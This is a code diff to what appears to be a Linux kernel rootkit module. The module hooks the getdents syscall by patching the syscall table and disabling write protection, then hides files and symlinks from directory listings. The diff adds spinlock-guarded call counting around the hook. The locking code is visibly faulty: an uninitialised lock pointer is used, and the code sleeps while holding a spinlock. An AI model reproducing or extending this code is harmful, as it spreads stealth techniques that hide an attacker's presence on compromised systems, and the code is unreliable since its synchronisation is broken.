@@ -4,6 +4,7 @@
  */
 #include <asm/uaccess.h>
 #include <linux/delay.h>
+#include <linux/spinlock.h>
 #include <linux/unistd.h>
 
 #include "include.h"
@@ -14,9 +15,12 @@ asmlinkage ssize_t (*syscall_readlinkat) (int dirfd, const char *path, char *buf
 
 /*
  * call counter to ensure that we are not unhooking the
- * getdents function while it is in use
+ * getdents function while it is in use and the corresponding
+ * spinlock
  */
 static int getdents_call_counter = 0;
+static spinlock_t *getdents_lock;
+static unsigned long getdents_lock_flags;
 
 /*
  * check if we need to hide this file because it matches
@@ -79,14 +83,14 @@ int hide_symlink(int fd, char *d_name)
 		set_fs(KERNEL_DS);
 	
 		/* execute our readlinkat syscall */
-		lpath_len = (*syscall_readlinkat) (fd, dirp->d_name, lpath, 128);
+		lpath_len = (*syscall_readlinkat) (fd, d_name, lpath, 128);
 	
 		/* reset the kernel */	
 		set_fs(old_fs);
 
 		// TODO: insert stop condition
 	
-	} while (lpath_len > 0)
+	} while (lpath_len > 0);
 
 	return 0;
 }
@@ -118,9 +122,11 @@ int check_symlink(char *path)
  */
 asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
+	/* lock and increase the call counter */
+	spin_lock_irqsave(getdents_lock, getdents_lock_flags);
 	getdents_call_counter++;
-	/* nothing else above this line */
-	
+	spin_unlock_irqrestore(getdents_lock, getdents_lock_flags);
+		
 	long ret;
 	int len = 0;
 	int tlen = 0;
@@ -133,19 +139,6 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 		len  = dirp->d_reclen;
 		tlen = tlen-len;
 		
-		/* tell the kernel to ignore kernel-space memory in syscalls */
-		old_fs = get_fs();
-		set_fs(KERNEL_DS);
-		
-		/* execute our readlinkat syscall */
-		lpath_len = (*syscall_readlinkat) (fd, dirp->d_name, lpath, 128);
-		
-		/* reset the kernel */	
-		set_fs(old_fs);
-		
-		/* terminate the string properly */	
-		memset(lpath+lpath_len, '\0', 1);	
-
 //		/* Check if we need to hide this symlink (only if it is a symlink ofc) */
 //		if(lpath_len > 0 && check_symlink(lpath))
 //		{
@@ -168,8 +161,11 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 
 	}
 	
-	/* nothing else below this line */
+	/* lock and decrease the call counter */
+	spin_lock_irqsave(getdents_lock, getdents_lock_flags);
 	getdents_call_counter--;
+	spin_unlock_irqrestore(getdents_lock, getdents_lock_flags);
+		
 	return ret;
 }
 
@@ -178,6 +174,9 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
  */
 void hook_getdents(void) {
 	void **sys_call_table = (void *) sysmap_sys_call_table;
+	
+	/* initialize our spinlock for the getdents counter */
+	spin_lock_init(getdents_lock);
 
 	/* get the 'readlinkat' syscall */
 	syscall_readlinkat = (void*) sys_call_table[__NR_readlinkat];
@@ -204,7 +203,11 @@ void unhook_getdents(void) {
 	/* disable write protection */
 	disable_page_protection();
 
-	/* make sure that all processes have left our manipulated syscall */
+	/* 
+	 * make sure that all processes have left our manipulated syscall. 
+	 * lock getdents_lock and keep it that way until we are done. 
+	 */
+	spin_lock_irqsave(getdents_lock, getdents_lock_flags);
 	while(getdents_call_counter > 0) {
 		msleep(10);
 	}
@@ -212,6 +215,9 @@ void unhook_getdents(void) {
 	/* restore the old syscall */
 	sys_call_table[__NR_getdents] = (int *) original_getdents;
 
+	/* release our lock on getdents */
+	spin_unlock_irqrestore(getdents_lock, getdents_lock_flags);
+	
 	/* reenable write protection */
 	enable_page_protection();
 }
